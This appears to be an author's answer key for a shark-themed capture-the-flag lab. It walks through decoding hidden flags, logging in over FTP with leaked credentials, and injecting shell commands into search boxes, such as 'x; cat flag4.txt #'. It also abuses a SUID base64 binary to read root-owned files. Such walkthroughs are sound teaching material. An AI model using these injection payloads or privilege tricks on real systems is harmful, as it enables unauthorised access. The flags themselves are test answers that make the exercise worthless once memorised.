# Solutions (author eyes only)

Replace TARGET with the box IP. Where a step says "in the search box," that's the species lookup on population.php (Flag 4+) or the fossil search on the depths page
(Flag 9). Both drop your text straight into a command, so ending a payload with # comments out the trailing part the page tacks on.

## Flag 1 - page source

Open http://TARGET/ and view the page source. In the first shark card there's an
HTML comment with a long base64 string and a note that it's base64. Decode it
(CyberChef, or `base64 -d` in a terminal):

    echo 'TENDVEZ7V2g0TDNTaDRSazIwTX0gKFdoYWxlIHNoYXJrcyBjYW4gZ3JvdyB1cCB0byAyMCBtZXRlcnMgbG9uZyk=' | base64 -d

    -> LCCTF{Wh4L3Sh4Rk20M}

Keep reading the source: another comment leaks the diver theme and the FTP
credentials diver / iLoV35h4rks. You'll need those next.

## Flag 2 & 3 - the FTP file server

A port scan shows FTP open on 21. Log in with the creds from Flag 1:

    ftp TARGET            # user: diver   pass: iLoV35h4rks

Download the only file, then unzip it (it's really a ZIP):
    
    get flag.abc
    file flag.abc (or open it in hex editor)
    unzip flag.abc        # -> flag2.txt and hammerhead.png

Flag 2 lives in flag2.txt as binary (strings of 1s and 0s). Paste it into any
binary-to-text decoder:

    -> LCCTF{Gr33nL4Nd400}

Flag 3 is hidden inside the image. Run strings on it (or open it in a hex editor)
and look for the flag:

    strings hammerhead.png | grep LCCTF

    -> LCCTF{h4Mm3RH34D1837}

## Flag 4 - command injection

The population lookup runs your input as part of a shell command. First list the
directory to see what's there. In the search box, enter:

    x; ls #

You'll spot flag4.txt. In the search box, enter:

    x; cat flag4.txt #

    -> LCCTF{gR34TwH173300}

## Flag 5 - SUID base64

The next flag is in /root/flag5.txt, which you can't read as the web user. But
base64 is SUID root (owned by root, runs with root's powers), so it can read
files you can't. In the search box, enter:

    x; base64 -w0 /root/flag5.txt #

That prints a base64 blob. Decode it on your machine:

    echo '<blob>' | base64 -d

    -> LCCTF{B4Sk1Ng1500Kg}

## Flag 6 - robots.txt breadcrumb

Open http://TARGET/robots.txt. It disallows a hidden path:

    Disallow: /super_secret_admin_page/

You may have also found this directory directly from using the `; ls #` command in the population lookup.

Visit http://TARGET/super_secret_admin_page/ and view the source. There's a
comment with hex bytes. Decode the hex (CyberChef "From Hex", or xxd -r -p):

    -> LCCTF{BullFr35HW473R}

## Flag 7 - layered cipher

The admin page links to mako.html. View its source. There's a comment holding a blob you peel one layer at a time:

    1) binary  -> text   (gives a hex string)
    2) hex     -> text   (gives a base64 string)
    3) base64  -> text   (the flag)

CyberChef can do all three at once; just stack the recipes.

    -> LCCTF{m4K03nd0Th3F457357}

## Flag 8 - the gate

Go to http://TARGET/final.php and enter all seven flags. If all seven are
right, the eighth decrypts and appears:

    -> LCCTF{3L45M0BR4NCH11}

There is no shortcut. The reward is encrypted under a key built from the seven flags, so it can't be read from source or via the injection without solving all of them.

## Flag 9 (bonus) - megalodon

Only reachable after Flag 8: the win screen links to `/deep/<slug>/`
(e.x. slug = bb3aa4102a7c12bdfee0f656 for this build).

The depths page has a fossil search that's injectable just like Flag 4. In the
search box, enter:

    x; ls -la /opt/megalodon #

You'll see fossils.txt, encrypt_megalodon.py (the cipher), and a hidden
.last_sighting. First try to read the hidden file the obvious way:

    x; cat /opt/megalodon/.last_sighting #

Permission denied because it's owned by root. Same trick as Flag 5: base64 is SUID
root. In the search box, enter:

    x; base64 -w0 /opt/megalodon/.last_sighting #

That prints a single base64 blob:

    HcobKuGM4jsAw2cLaztb78T52HUyseO45YU9lZhjEbmrsJkUQwE4QHm63Ps7kp4gJhG9SEWRc8QDDlqDjmIPqTkNpnDB0Fdnyw0=

Grab the cipher too, so you know how it was sealed. In the search box, enter:

    x; cat /opt/megalodon/encrypt_megalodon.py #

and copy to your own machine.

The key is Flag 8. To find this, there's a hint in encrypt_megalodon.py to look for the key under the ASCII stingray in final.php. If you use command injection to cat final.php (you need to do this to see the comments) you will see that the variable for flag8 is directly under the ASCII stingray. This extra step makes it impossible to get flag9 without flag8 first.

Now, also on your own machine: decode the blob to the raw sealed bytes, then decrypt using flag8 as the key.

    echo 'HcobKu...nyw0=' | base64 -d > sealed.bin
    python3 encrypt_megalodon.py dec -k 'LCCTF{3L45M0BR4NCH11}' -i sealed.bin

    -> LCCTF{0T0D5M3g4L0D0N}

